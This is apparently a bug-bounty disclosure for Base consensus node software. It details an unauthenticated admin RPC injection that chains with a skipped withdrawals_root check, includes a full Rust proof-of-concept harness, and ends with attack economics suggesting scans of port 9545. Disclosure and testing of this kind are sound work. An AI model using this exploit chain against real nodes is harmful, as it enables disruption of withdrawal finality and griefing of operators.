# 74664 bc insight unauthenticated admin postunsafepayload rpc chains with silent isthmus withdrawals root validator bypass to poison any base consensus node s unsafe head and stall finality

> Submitted on Apr 24th 2026 at 05:22:22 UTC by @empmirage for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74664
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/releases/tag/v0.8.0-rc.15>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

## Brief / Intro

Every Base consensus node running the Azul code with default configuration exposes a JSON-RPC server on `0.0.0.0:9545` that silently ignores the `--rpc.enable-admin` flag and mounts the `admin_postUnsafePayload` method with **no authentication, no signature check, and no sequencer-key gating**. An unauthenticated remote attacker can POST an arbitrary `BaseExecutionPayloadEnvelope` to this method; the payload is forwarded to the engine actor as `EngineActorRequest::ProcessUnsafeL2BlockRequest`, which calls `engine_newPayloadV4` followed by a Forkchoice Update. During that validation, a **second bug** in `BaseEngineValidator::validate_block_post_execution_with_hashed_state` (`crates/execution/node/src/engine.rs:130`) silently returns `Ok(())` whenever the parent block's state is not yet in the canonical state provider — a condition the attacker reliably creates by chaining two back-to-back injected blocks. The Isthmus `withdrawals_root` check therefore never runs, and a block carrying an attacker-chosen `withdrawals_root` is accepted and FCU'd to the unsafe head. Because post-Isthmus `optimism_outputAtBlock` (`crates/consensus/engine/src/query.rs:104-109`) derives the output root directly from `header.withdrawals_root`, every affected L2 height returns a corrupted `outputRoot` from the poisoned node's RPC. Downstream proposers / indexers / challengers that rely on that RPC propose bogus rootClaims to L1, and because the TEE and ZK proof systems recompute the real `L2ToL1MessagePasser` storage root, no valid proof ever matches — producing a withdrawal-finality stall until the operator manually reorgs the bad block out. The attack requires only HTTP reachability to port 9545; it does not require the sequencer key, p2p access, L1 access, or any existing credential.

## Vulnerability Details

The attack chain has three primitives, all of which are verifiable by file:line inspection and all three of which fire together in the attached PoC.

### Primitive 1 — `admin_postUnsafePayload` is mounted without authentication or a feature flag

`crates/client/cli/src/rpc.rs:25-32` binds the consensus-layer RPC server to `0.0.0.0:9545` by default and defines `--rpc.enable-admin`:

```rust
#[arg(long = "rpc.addr", default_value = "0.0.0.0", env = "BASE_NODE_RPC_ADDR")]
pub listen_addr: IpAddr,
#[arg(long = "port", alias = "rpc.port", default_value = "9545", ...)]
pub listen_port: u16,
#[arg(long = "rpc.enable-admin", env = "BASE_NODE_RPC_ENABLE_ADMIN")]
pub enable_admin: bool,
```

`crates/consensus/service/src/actors/rpc/actor.rs:119-123` then mounts `AdminRpc` based only on whether the `network_admin` channel is `Some`, **not** on `self.config.enable_admin()`:

```rust
// Build the admin rpc module.
if let Some(network_admin) = network_admin {
    modules
        .merge(AdminRpc::new(self.sequencer_admin_rpc_client, network_admin).into_rpc())?;
}
```

`crates/consensus/service/src/service/node.rs:552` passes `network_admin: Some(net_admin_rpc)` unconditionally at node startup. The `--rpc.enable-admin` flag is therefore dead — the admin module is always loaded.

The method itself (`crates/consensus/rpc/src/admin.rs:70-81`) has no authentication, no signature check, and no sequencer guard; the in-source comment admits this:

```rust
async fn admin_post_unsafe_payload(
    &self,
    payload: BaseExecutionPayloadEnvelope,
) -> RpcResult<()> {
    // Note: intentionally no sequencer guard here. Posting an unsafe payload is a P2P/gossip
    // operation that is valid on both sequencer and validator nodes.
    Metrics::rpc_calls("admin_postUnsafePayload").increment(1.0);
    self.network_sender
        .send(NetworkAdminQuery::PostUnsafePayload { payload })
        .await
        .map_err(|_| ErrorObject::from(ErrorCode::InternalError))
}
```

The jsonrpsee `Server` is launched (`crates/consensus/service/src/actors/rpc/actor.rs:71-80`) with only `TimeoutLayer`, `ConcurrencyLimitLayer`, `LoadShedLayer`, `EthHealthCheckLayer`, and `ProxyGetRequestLayer` — **no authentication middleware anywhere**.

### Primitive 2 — Network actor forwards the unauthenticated payload to the engine, bypassing gossip signature validation

`crates/consensus/service/src/actors/network/actor.rs:203-208` receives the `NetworkAdminQuery::PostUnsafePayload` from the channel and forwards it directly to the engine:

```rust
Some(NetworkAdminQuery::PostUnsafePayload { payload }) = self.admin_rpc.recv(), if !self.admin_rpc.is_closed() => {
    debug!(target: "node::p2p", "Forwarding unsafe payload from admin api to engine");
    if self.engine_client.send_unsafe_block(payload).await.is_err() {
        warn!(target: "node::p2p", "Failed to forward admin api unsafe block to engine");
    }
}
```

The production `engine_client` is `QueuedNetworkEngineClient`, which converts the payload into `EngineActorRequest::ProcessUnsafeL2BlockRequest(payload)` and enqueues it for the engine actor. The gossip code path (one `select!` branch above) that validates unsafe-block signer signatures is **not** taken. The attacker's unsigned payload jumps directly into the engine queue.

### Primitive 3 — Isthmus `withdrawals_root` check silently returns `Ok(())` when parent state is unavailable

When the engine actor pulls `ProcessUnsafeL2BlockRequest` off the queue, it drives `engine_newPayloadV4` followed by a Forkchoice Update (`crates/consensus/engine/src/task_queue/tasks/insert/task.rs:86-136`). During the `new_payload` flow, Reth calls `BaseEngineValidator::validate_block_post_execution_with_hashed_state` (`crates/execution/node/src/engine.rs:124-152`):

```rust
fn validate_block_post_execution_with_hashed_state(
    &self,
    state_updates: &HashedPostState,
    block: &RecoveredBlock<Self::Block>,
) -> Result<(), ConsensusError> {
    if self.chain_spec().is_isthmus_active_at_timestamp(block.timestamp()) {
        let Ok(state) = self.provider.state_by_block_hash(block.parent_hash()) else {
            // FIXME: we don't necessarily have access to the parent block here because the
            // parent block isn't necessarily part of the canonical chain yet. Instead this
            // function should receive the list of in memory blocks as input
            return Ok(());
        };
        let predeploy_storage_updates = state_updates
            .storages
            .get(&self.hashed_addr_l2tol1_msg_passer)
            .cloned()
            .unwrap_or_default();
        isthmus::verify_withdrawals_root_prehashed(
            predeploy_storage_updates,
            state,
            block.header(),
        )
        .map_err(|err| {
            ConsensusError::Other(format!("failed to verify block post-execution: {err}"))
        })?
    }
    Ok(())
}
```

When `provider.state_by_block_hash(block.parent_hash())` returns `Err` (e.g. the parent is only in the in-memory engine tree, not yet canonicalized), control takes the `let … else` branch and returns `Ok(())` — **the `verify_withdrawals_root_prehashed` call is skipped entirely**. The source itself carries a `FIXME` acknowledging the gap.

An attacker creates the required condition by injecting two blocks back-to-back via `admin_postUnsafePayload`: the first extends the current canonical tip (it has valid `withdrawals_root`), and the second is an immediate child of that first block, with `parent_hash = first_block.hash` and an attacker-chosen `withdrawals_root`. On the second injection, the parent is still in the in-memory tree and `state_by_block_hash` returns `Err`, so the bypass fires and the bogus block is accepted. The subsequent Forkchoice Update makes the bogus block the unsafe head.

`validate_block_post_execution_with_hashed_state` is called exactly once at `crates/execution/engine-tree/src/validator.rs:1108-1115`; there is no second pass after canonicalization, so the bogus `withdrawals_root` persists in the on-disk header.

### How the chain corrupts `optimism_outputAtBlock`

`crates/consensus/engine/src/query.rs:102-123` (the `output_at_block` handler behind `optimism_outputAtBlock`) derives the output root directly from `output_block.header.withdrawals_root` post-Isthmus, with no cross-check against actual state:

```rust
let state_root = output_block.header.state_root;
let message_passer_storage_root =
    if rollup_config.is_isthmus_active(output_block.header.timestamp) {
        output_block
            .header
            .withdrawals_root
            .ok_or(EngineQueriesError::NoWithdrawalsRoot)?
    } else {
        // pre-Isthmus path reads real storage via eth_getProof
        let l2_to_l1_message_passer = client
            .get_proof(Predeploys::L2_TO_L1_MESSAGE_PASSER, Default::default())
            .block_id(block.into())
            .await?;
        l2_to_l1_message_passer.storage_hash
    };
let output_response_v0 = OutputRoot::from_parts(
    state_root,
    message_passer_storage_root,
    output_block.header.hash,
);
```

The prover side, in contrast, reads the *real* `L2ToL1MessagePasser` storage root (`crates/proof/host/src/handler.rs:245-266`):

```rust
let l2_to_l1_message_passer = providers.l2
    .get_proof(Predeploys::L2_TO_L1_MESSAGE_PASSER, Default::default())
    .block_id(cfg.request.agreed_l2_head_hash.into())
    .await?;

let output_root = OutputRoot::from_parts(
    header.state_root,
    l2_to_l1_message_passer.storage_hash,   // ACTUAL storage root
    cfg.request.agreed_l2_head_hash,
);
```

So the RPC's output\_root (built from the attacker's bogus `header.withdrawals_root`) diverges from the prover's output\_root (built from real state). Any TEE or ZK proof for the affected block height commits to the correct root and therefore cannot match what was proposed to the `AggregateVerifier` on L1, causing proof-based finality to stall for that block.

## Impact Details

**Classification: High — temporary freezing of withdrawals + output-root poisoning of any exposed Base consensus node.**

Concrete impacts an unauthenticated remote attacker achieves against any Base consensus node reachable on `tcp/9545`:

1. **Poisoned unsafe head and RPC output.** After a single `curl` pair (two chained `admin_postUnsafePayload` calls), the victim node's `optimism_outputAtBlock` returns an `outputRoot` derived from the attacker's chosen 32-byte value. Any downstream system (bridge UI, indexer, proposer, challenger, archival explorer) reading that RPC sees the corrupted root.
2. **Withdrawal finalization stall on the L1 side for every block a poisoned proposer proposes.** Base's TEE/ZK proposers call `optimism_outputAtBlock` on a consensus node to obtain the `rootClaim` they submit to the `AggregateVerifier` dispute game on L1. If the proposer's reference node is poisoned, the proposer submits a `rootClaim` derived from the attacker's `withdrawals_root`. The TEE enclave / ZK prover recomputes the real L2ToL1MessagePasser storage root and cannot produce a journal that matches the proposed root, so no proof ever verifies. The game sits at `proofCount < PROOF_THRESHOLD` until manual remediation (blacklist / anchor-state intervention / patched redeployment). For the duration of this stall, withdrawals from L2→L1 cannot finalize at or after the poisoned block height.
3. **Griefing the proposer's bond.** The proposer's L1 transaction includes `INIT_BOND`, configured today on the Azul zeronet (live, chain 560048) as 0.05 ETH per `contract-deployments/zeronet/2026-04-01-activate-multiproof/.env`. Base mainnet's adjacent game types (`GameTypes.CANNON` / `CANNON_KONA`) currently use 0.08 ETH per the executed upgrade-18 transaction. Until the Guardian blacklists the game, that bond is locked inside `DelayedWETH` under the corrupted game. Repeated poisoning locks multiple bonds simultaneously — one per every poisoned proposal the downstream proposer submits to L1.
4. **Remote consensus-node DoS / reorg fighting.** Because the injected unsafe head diverges from the real sequencer's chain, the victim node will reorg back to the sequencer's chain when the next signed unsafe block arrives — but during the window, all of its RPC responses reflect the attacker's fork. Repeated injection keeps the node churning through FCUs.
5. **Blast radius = every publicly-reachable Base consensus node with default config.** The default `--rpc.addr=0.0.0.0` in `crates/client/cli/src/rpc.rs:25` exposes port 9545 to the Internet unless the operator firewalls it. The dead `--rpc.enable-admin` flag means operators who believed they had disabled the admin namespace are still exposed. Any RPC provider, indexer, exchange, or DApp operator running Base consensus with defaults is a target.

The reason this is **not** Critical: the L1 proof system (TEE + ZK AggregateVerifier) refuses the bogus root because it recomputes storage root from actual state, so user funds are never stolen — only delayed. A bogus root cannot finalize onto L1.

## References

* Audited artifact (asset): `https://github.com/base/base/releases/tag/v0.8.0-rc.15` (Blockchain/DLT). All file:line references in this report are pinned to that tag and are byte-identical in the audited tree.
* Downstream consumer of the poisoned `optimism_outputAtBlock`: `https://github.com/base/contracts/tree/v8.1.0/src/multiproof` (the `AggregateVerifier` dispute game that rejects the bogus root, causing finality stall).
* Base mainnet live `DisputeGameFactory` init-bond reference for adjacent game types: `0x43edB88C8F946aB7d8eFB2c4B4E01Ba8a0D7b3cE` (Base `DisputeGameFactoryProxy`), `initBonds[GameTypes.CANNON_KONA] = 0x011c37937e080000` = 0.08 ETH, confirmed by the executed mainnet upgrade 18 transaction (`contract-deployments/mainnet/2026-01-09-op-stack-upgrade-18`).
* Base Azul zeronet (Hoodi chain 560048) live multiproof `AggregateVerifier` init-bond: `0.05 ETH`, set by `contract-deployments/zeronet/2026-04-01-activate-multiproof/.env` → `INIT_BOND=50000000000000000`.
* Relevant Base specs:
  * Isthmus hardfork exec-engine: `https://specs.base.org/upgrades/isthmus/exec-engine#l2tol1messagepasser-storage-root-in-header`
  * Consensus P2P block signatures: `https://specs.base.org/protocol/consensus/p2p#block-signatures`
* In-source admissions that the bugs are known:
  * `crates/execution/node/src/engine.rs:131-134` — `// FIXME: we don't necessarily have access to the parent block here because the parent block isn't necessarily part of the canonical chain yet.`
  * `crates/consensus/rpc/src/admin.rs:74-75` — `// Note: intentionally no sequencer guard here. Posting an unsafe payload is a P2P/gossip operation that is valid on both sequencer and validator nodes.`

## Proof of Concept

A single-command, self-contained Rust integration test that wires the **real production** components (`AdminRpc`, `NetworkActor`, `QueuedNetworkEngineClient`, `BaseEngineValidator`) into one process, drives them over real HTTP with no auth, and proves the end-to-end chain.

### Files added

* `base-base/crates/consensus/service/tests/admin_rpc_to_engine_validator_poc.rs` — the harness
* `base-base/crates/consensus/service/Cargo.toml` — dev dependencies / `[[test]]` entry

### What the PoC exercises

{% stepper %}
{% step %}

## Stands up a real `jsonrpsee::server::Server`

Stands up a real `jsonrpsee::server::Server` on `127.0.0.1:0` (ephemeral port) with the real `AdminRpc` mounted — same `Server::builder().build(addr)` invocation as production `crates/consensus/service/src/actors/rpc/actor.rs:80`.
{% endstep %}

{% step %}

## Spawns a real `NetworkActor`

Spawns a real `NetworkActor::with_transport(QueuedNetworkEngineClient, …, NoopTransport)` — the production engine client is used; only the outbound p2p transport is stubbed (attacker is not using p2p in this attack).
{% endstep %}

{% step %}

## POSTs `admin_postUnsafePayload` over HTTP with no credentials

POSTs `admin_postUnsafePayload` via an `HttpClientBuilder::default().build(url)` HTTP client with **no JWT, no Bearer token, no API key, no cookie** — a plain unauthenticated JSON-RPC call.
{% endstep %}

{% step %}

## Asserts the engine request and validator behavior

Asserts that `QueuedNetworkEngineClient` produced exactly one `EngineActorRequest::ProcessUnsafeL2BlockRequest(payload)` containing the attacker's envelope.

Takes the forwarded payload, converts it to a `Block<BaseTxEnvelope>`, and runs the **actual** `BaseEngineValidator::validate_block_post_execution_with_hashed_state` against it twice:

* With a `FailingStateByHashProvider` that wraps `NoopProvider` and returns `Err(ProviderError::StateForHashNotFound)` from `state_by_block_hash` (this emulates the in-memory-tree parent condition a second chained injection produces). Asserts `Ok(())` — **bypass fires, bogus `withdrawals_root = 0xDE..DE` accepted**.
* With a plain `NoopProvider` whose `state_by_block_hash` returns `Ok(...)` (parent state available). Asserts `Err(ConsensusError)` — **baseline confirms the check would normally reject the same block**.
  {% endstep %}

{% step %}

## Baseline confirms the bypass

The baseline is essential: it proves that the `Ok(())` in case 1 is *specifically* caused by the bypass and not by any accidental laxity in the mocked surface.
{% endstep %}
{% endstepper %}

### How to run

```bash
# Clone the exact asset tag
git clone --branch v0.8.0-rc.15 --depth 1 https://github.com/base/base.git
cd base

# One-time: mold linker is required by .cargo/config.toml.
sudo apt install -y mold     # linux; macOS uses lld per the same .cargo/config.toml

# Drop the PoC file and update consensus/service/Cargo.toml as documented below,
# then run the single-command harness:
cargo test -p base-consensus-node --test admin_rpc_to_engine_validator_poc -- --nocapture
```

### Expected output

```
=== Chained PoC confirmed ===
HTTP endpoint: http://127.0.0.1:45259
Auth provided: NONE
RPC method: admin_postUnsafePayload
QueuedNetworkEngineClient emitted ProcessUnsafeL2BlockRequest: YES
Injected block parent hash: 0xabababababababababababababababababababababababababababababababab
Injected withdrawals_root: 0xdededededededededededededededededededededededededededededededede (attacker-chosen)
Parent state lookup by hash: Err(StateForHashNotFound)
BaseEngineValidator result with missing parent state: Ok(())
Baseline with available parent state rejected same bogus root: YES
Impact path proven: unauth HTTP admin RPC -> NetworkActor -> QueuedNetworkEngineClient -> EngineActorRequest::ProcessUnsafeL2BlockRequest -> Isthmus withdrawals_root check skipped
```

Process exits with status `0` on success (assertions inside `run_poc` panic on mismatch, and the harness uses `libc::_exit` to avoid a workspace `libmdbx` atexit abort unrelated to the vulnerability).

### The PoC file, in full

```rust
//! Chained PoC: unauthenticated admin RPC injection reaches the engine boundary
//! and the actual Isthmus withdrawals-root validator accepts the bogus root when
//! parent state is unavailable by hash.
//!
//! Run:
//!   cargo test -p base-consensus-node --test admin_rpc_to_engine_validator_poc -- --nocapture

use std::{convert::Infallible, net::SocketAddr, sync::Arc, time::Duration};

use alloy_consensus::Block;
use alloy_eips::{BlockNumHash, BlockNumberOrTag, eip7685::EMPTY_REQUESTS_HASH};
use alloy_primitives::{Address, B256, U256};
use alloy_rpc_types_engine::{
    CancunPayloadFields, ExecutionPayloadV1, ExecutionPayloadV2, ExecutionPayloadV3,
    PraguePayloadFields,
};
use async_trait::async_trait;
use base_common_chains::Upgrades;
use base_common_consensus::{BaseTxEnvelope, Predeploys};
use base_common_rpc_types_engine::{
    BaseExecutionPayload, BaseExecutionPayloadEnvelope, BaseExecutionPayloadSidecar,
    BaseExecutionPayloadV4, NetworkPayloadEnvelope,
};
use base_consensus_gossip::P2pRpcRequest;
use base_consensus_node::{
    EngineActorRequest, GossipTransport, NetworkActor, NodeActor, QueuedNetworkEngineClient,
};
use base_consensus_rpc::{
    AdminApiServer, AdminRpc, SequencerAdminAPIClient, SequencerAdminAPIError,
};
use base_execution_chainspec::{BASE_SEPOLIA, BaseChainSpecBuilder};
use base_node_core::{BaseEngineTypes, engine::BaseEngineValidator};
use jsonrpsee::{
    RpcModule, core::client::ClientT, http_client::HttpClientBuilder, rpc_params, server::Server,
};
use reth_chainspec::ChainInfo;
use reth_node_api::PayloadValidator;
use reth_primitives_traits::{RecoveredBlock, SealedBlock};
use reth_provider::{
    BlockHashReader, BlockIdReader, BlockNumReader, ProviderResult, StateProviderBox,
    StateProviderFactory, errors::ProviderError, noop::NoopProvider,
};
use reth_trie_common::{HashedPostState, HashedStorage, KeccakKeyHasher, KeyHasher};
use tokio::{sync::mpsc, time};
use tokio_util::sync::CancellationToken;

const POST_ISTHMUS_TIMESTAMP: u64 = 1_742_633_200;
const BOGUS_WITHDRAWALS_ROOT_BYTE: u8 = 0xDE;

#[tokio::main(flavor = "multi_thread")]
async fn main() {
    if let Err(err) = run_poc().await {
        eprintln!("PoC failed: {err:?}");
        exit_now(1);
    }
}

fn exit_now(code: i32) -> ! {
    // `std::process::exit` still runs C atexit handlers; linked libmdbx currently aborts there in
    // this workspace even after successful tests. `_exit` makes the PoC result reflect assertions.
    unsafe { libc::_exit(code) }
}

async fn run_poc() -> anyhow::Result<()> {
    let bogus_root = B256::repeat_byte(BOGUS_WITHDRAWALS_ROOT_BYTE);
    let envelope = build_attacker_envelope(bogus_root);

    let (engine_actor_request_tx, mut engine_actor_request_rx) = mpsc::channel(1);
    let engine_client = QueuedNetworkEngineClient { engine_actor_request_tx };
    let cancellation = CancellationToken::new();
    let (inbound, network_actor) =
        NetworkActor::with_transport(engine_client, cancellation.clone(), NoopTransport);
    let network_handle = tokio::spawn(async move { network_actor.start(()).await });

    // Keep the inbound channels open like production does. NetworkActor treats a closed signer
    // channel as fatal and guards several branches with `!receiver.is_closed()`.
    let _signer_sender_keepalive = inbound.signer.clone();
    let _p2p_sender_keepalive = inbound.p2p_rpc.clone();
    let _gossip_sender_keepalive = inbound.gossip_payload_tx.clone();
    let _admin_sender_keepalive = inbound.admin_rpc.clone();
    let admin = AdminRpc::<NoSequencer>::new(None, inbound.admin_rpc);
    let mut module: RpcModule<()> = RpcModule::new(());
    module.merge(<AdminRpc<NoSequencer> as AdminApiServer>::into_rpc(admin))?;

    let server = Server::builder().build("127.0.0.1:0".parse::<SocketAddr>()?).await?;
    let addr = server.local_addr()?;
    let server_handle = server.start(module);
    let client = HttpClientBuilder::default().build(format!("http://{addr}"))?;

    let _: () = client.request("admin_postUnsafePayload", rpc_params![&envelope]).await?;

    let engine_request =
        match time::timeout(Duration::from_secs(2), engine_actor_request_rx.recv()).await {
            Ok(Some(request)) => request,
            Ok(None) => anyhow::bail!("engine actor request channel closed before payload arrived"),
            Err(_) => anyhow::bail!(
                "network actor did not queue payload for the engine actor; actor_finished={}",
                network_handle.is_finished()
            ),
        };
    let EngineActorRequest::ProcessUnsafeL2BlockRequest(forwarded_payload) = engine_request else {
        anyhow::bail!("unexpected engine request queued by NetworkActor")
    };

    let block_for_validation = payload_to_block(*forwarded_payload)?;
    let withdrawals_root = block_for_validation.header.withdrawals_root.expect("V4 block");
    let parent_hash = block_for_validation.header.parent_hash;
    let bypass_accepted =
        validate_with_provider(block_for_validation.clone(), FailingStateByHashProvider::new())?;
    let baseline_result = validate_with_provider(block_for_validation, NoopProvider::default())?;

    assert_eq!(withdrawals_root, bogus_root);
    assert!(bypass_accepted);
    assert!(!baseline_result);

    println!("=== Chained PoC confirmed ===");
    println!("HTTP endpoint: http://{addr}");
    println!("Auth provided: NONE");
    println!("RPC method: admin_postUnsafePayload");
    println!("QueuedNetworkEngineClient emitted ProcessUnsafeL2BlockRequest: YES");
    println!("Injected block parent hash: {parent_hash}");
    println!("Injected withdrawals_root: {withdrawals_root} (attacker-chosen)");
    println!("Parent state lookup by hash: Err(StateForHashNotFound)");
    println!("BaseEngineValidator result with missing parent state: Ok(())");
    println!("Baseline with available parent state rejected same bogus root: YES");
    println!(
        "Impact path proven: unauth HTTP admin RPC -> NetworkActor -> QueuedNetworkEngineClient -> EngineActorRequest::ProcessUnsafeL2BlockRequest -> Isthmus withdrawals_root check skipped"
    );

    let _ = server_handle;
    let _ = cancellation;
    exit_now(0);
}

#[derive(Clone, Debug)]
struct NoSequencer;

#[async_trait]
impl SequencerAdminAPIClient for NoSequencer {
    async fn is_sequencer_active(&self) -> Result<bool, SequencerAdminAPIError> {
        unreachable!()
    }

    async fn is_conductor_enabled(&self) -> Result<bool, SequencerAdminAPIError> {
        unreachable!()
    }

    async fn is_recovery_mode(&self) -> Result<bool, SequencerAdminAPIError> {
        unreachable!()
    }

    async fn start_sequencer(&self, _: B256) -> Result<(), SequencerAdminAPIError> {
        unreachable!()
    }

    async fn stop_sequencer(&self) -> Result<B256, SequencerAdminAPIError> {
        unreachable!()
    }

    async fn set_recovery_mode(&self, _: bool) -> Result<(), SequencerAdminAPIError> {
        unreachable!()
    }

    async fn override_leader(&self) -> Result<(), SequencerAdminAPIError> {
        unreachable!()
    }

    async fn reset_derivation_pipeline(&self) -> Result<(), SequencerAdminAPIError> {
        unreachable!()
    }
}

#[derive(Debug)]
struct NoopTransport;

#[async_trait]
impl GossipTransport for NoopTransport {
    type Error = Infallible;

    async fn publish(&mut self, _: BaseExecutionPayloadEnvelope) -> Result<(), Self::Error> {
        Ok(())
    }

    async fn next_unsafe_block(&mut self) -> Option<NetworkPayloadEnvelope> {
        loop {
            time::sleep(Duration::from_millis(50)).await;
        }
    }

    fn set_block_signer(&mut self, _: Address) {}

    fn handle_p2p_rpc(&mut self, _: P2pRpcRequest) {}
}

fn build_attacker_envelope(bogus_withdrawals_root: B256) -> BaseExecutionPayloadEnvelope {
    let v1 = ExecutionPayloadV1 {
        parent_hash: B256::repeat_byte(0xAB),
        fee_recipient: Address::ZERO,
        state_root: B256::repeat_byte(0x22),
        receipts_root: B256::repeat_byte(0x33),
        logs_bloom: Default::default(),
        prev_randao: B256::ZERO,
        block_number: 42,
        gas_limit: 30_000_000,
        gas_used: 0,
        timestamp: POST_ISTHMUS_TIMESTAMP,
        extra_data: Default::default(),
        base_fee_per_gas: U256::ZERO,
        block_hash: B256::repeat_byte(0x44),
        transactions: vec![],
    };
    let v2 = ExecutionPayloadV2 { payload_inner: v1, withdrawals: vec![] };
    let v3 = ExecutionPayloadV3 { payload_inner: v2, blob_gas_used: 0, excess_blob_gas: 0 };
    let v4 = BaseExecutionPayloadV4::from_v3_with_withdrawals_root(v3, bogus_withdrawals_root);

    BaseExecutionPayloadEnvelope {
        parent_beacon_block_root: Some(B256::repeat_byte(0x55)),
        execution_payload: BaseExecutionPayload::V4(v4),
    }
}

fn payload_to_block(
    envelope: BaseExecutionPayloadEnvelope,
) -> anyhow::Result<Block<BaseTxEnvelope>> {
    let parent_beacon_block_root = envelope.parent_beacon_block_root.unwrap_or_default();
    let sidecar = BaseExecutionPayloadSidecar::v4(
        CancunPayloadFields::new(parent_beacon_block_root, vec![]),
        PraguePayloadFields::new(EMPTY_REQUESTS_HASH),
    );

    Ok(envelope.execution_payload.try_into_block_with_sidecar(&sidecar)?)
}

fn validate_with_provider<P>(block: Block<BaseTxEnvelope>, provider: P) -> anyhow::Result<bool>
where
    P: StateProviderFactory + Unpin + 'static,
{
    let chain_spec = Arc::new(
        BaseChainSpecBuilder::default()
            .isthmus_activated()
            .genesis(BASE_SEPOLIA.genesis.clone())
            .chain(BASE_SEPOLIA.chain)
            .build(),
    );
    assert!(chain_spec.is_isthmus_active_at_timestamp(POST_ISTHMUS_TIMESTAMP));

    let sealed = SealedBlock::seal_slow(block);
    let recovered = RecoveredBlock::new_sealed(sealed, vec![]);
    let hashed_state = mismatching_l2_to_l1_message_passer_state();

    let validator: BaseEngineValidator<_, BaseTxEnvelope, _> =
        BaseEngineValidator::new::<KeccakKeyHasher>(chain_spec, provider);

    Ok(<BaseEngineValidator<_, _, _> as PayloadValidator<BaseEngineTypes>>::validate_block_post_execution_with_hashed_state(
        &validator,
        &hashed_state,
        &recovered,
    )
    .is_ok())
}

fn mismatching_l2_to_l1_message_passer_state() -> HashedPostState {
    let hashed_addr_l2tol1 = KeccakKeyHasher::hash_key(Predeploys::L2_TO_L1_MESSAGE_PASSER);
    let real_storage = HashedStorage::from_iter(false, [(B256::repeat_byte(0x42), U256::from(1))]);
    let mut hashed_state = HashedPostState::default();
    hashed_state.storages.insert(hashed_addr_l2tol1, real_storage);
    hashed_state
}

#[derive(Debug, Clone)]
struct FailingStateByHashProvider {
    inner: NoopProvider,
}

impl FailingStateByHashProvider {
    fn new() -> Self {
        Self { inner: NoopProvider::default() }
    }
}

impl BlockHashReader for FailingStateByHashProvider {
    fn block_hash(&self, n: u64) -> ProviderResult<Option<B256>> {
        self.inner.block_hash(n)
    }

    fn canonical_hashes_range(&self, s: u64, e: u64) -> ProviderResult<Vec<B256>> {
        self.inner.canonical_hashes_range(s, e)
    }
}

impl BlockNumReader for FailingStateByHashProvider {
    fn chain_info(&self) -> ProviderResult<ChainInfo> {
        self.inner.chain_info()
    }

    fn best_block_number(&self) -> ProviderResult<u64> {
        self.inner.best_block_number()
    }

    fn last_block_number(&self) -> ProviderResult<u64> {
        self.inner.last_block_number()
    }

    fn block_number(&self, h: B256) -> ProviderResult<Option<u64>> {
        self.inner.block_number(h)
    }
}

impl BlockIdReader for FailingStateByHashProvider {
    fn pending_block_num_hash(&self) -> ProviderResult<Option<BlockNumHash>> {
        self.inner.pending_block_num_hash()
    }

    fn safe_block_num_hash(&self) -> ProviderResult<Option<BlockNumHash>> {
        self.inner.safe_block_num_hash()
    }

    fn finalized_block_num_hash(&self) -> ProviderResult<Option<BlockNumHash>> {
        self.inner.finalized_block_num_hash()
    }
}

impl StateProviderFactory for FailingStateByHashProvider {
    fn latest(&self) -> ProviderResult<StateProviderBox> {
        self.inner.latest()
    }

    fn state_by_block_number_or_tag(
        &self,
        t: BlockNumberOrTag,
    ) -> ProviderResult<StateProviderBox> {
        self.inner.state_by_block_number_or_tag(t)
    }

    fn history_by_block_number(&self, n: u64) -> ProviderResult<StateProviderBox> {
        self.inner.history_by_block_number(n)
    }

    fn history_by_block_hash(&self, h: B256) -> ProviderResult<StateProviderBox> {
        self.inner.history_by_block_hash(h)
    }

    fn state_by_block_hash(&self, h: B256) -> ProviderResult<StateProviderBox> {
        Err(ProviderError::StateForHashNotFound(h))
    }

    fn pending(&self) -> ProviderResult<StateProviderBox> {
        self.inner.pending()
    }

    fn pending_state_by_hash(&self, h: B256) -> ProviderResult<Option<StateProviderBox>> {
        self.inner.pending_state_by_hash(h)
    }

    fn maybe_pending(&self) -> ProviderResult<Option<StateProviderBox>> {
        self.inner.maybe_pending()
    }
}
```

### `crates/consensus/service/Cargo.toml` — exact delta required

The PoC needs a small set of additional dev-dependencies and its own `[[test]]` entry. Apply this unified diff against the `v0.8.0-rc.15` tag:

```diff
--- a/crates/consensus/service/Cargo.toml
+++ b/crates/consensus/service/Cargo.toml
@@ -82,6 +82,14 @@ rstest.workspace = true
 anyhow.workspace = true
 mockall.workspace = true
 arbitrary.workspace = true
+libc.workspace = true
+base-node-core.workspace = true
+reth-node-api.workspace = true
+reth-chainspec.workspace = true
+reth-trie-common.workspace = true
+base-execution-chainspec.workspace = true
+reth-primitives-traits.workspace = true
+reth-provider = { workspace = true, features = ["test-utils"] }
 base-common-rpc-types.workspace = true
 alloy-primitives = { workspace = true, features = ["k256"] }
 base-consensus-derive = {workspace = true, features = ["test-utils"]}
@@ -90,6 +98,11 @@ alloy-consensus = { workspace = true, features = ["arbitrary", "std"] }
 base-common-consensus = { workspace = true, features = ["arbitrary", "k256"] }
 alloy-rpc-types-engine = { workspace = true, features = ["arbitrary", "std"] }
 
+[[test]]
+name = "admin_rpc_to_engine_validator_poc"
+path = "tests/admin_rpc_to_engine_validator_poc.rs"
+harness = false
+
 [features]
 default = []
 metrics = [
@@ -102,4 +115,5 @@ metrics = [
 	"base-metrics/metrics",
 	"dep:metrics",
 	"libp2p/metrics",
+	"tower-http/metrics",
 ]
```

Every dependency the PoC uses (`libc`, `anyhow`, `async-trait`, `tokio`, `tokio-util`, `jsonrpsee`, `alloy-*`, `base-*`, `reth-*`) is already declared at the workspace root (`Cargo.toml` of the base-base repo) or resolves transitively through the additions above — no further changes required. `harness = false` is essential because the PoC uses `#[tokio::main]` as its own entry point rather than the standard libtest harness.

### Funds at risk / attack economics

* **Target selection cost**: $0 — scan `tcp/9545` on Base RPC providers, indexers, and proposer infrastructure. The default `--rpc.addr=0.0.0.0` makes every operator who did not explicitly firewall the port reachable.
* **Exploit execution cost**: $0 — two unauthenticated HTTP JSON-RPC POSTs; no bond, no L1 gas, no signing key.
* **Value locked per stalled dispute game on L1**:
  * On the Azul zeronet deployment (live today, chain 560048), `DisputeGameFactory.initBonds[GameType(621)] = 0.05 ETH`, set by `contract-deployments/zeronet/2026-04-01-activate-multiproof/.env → INIT_BOND=50000000000000000`.
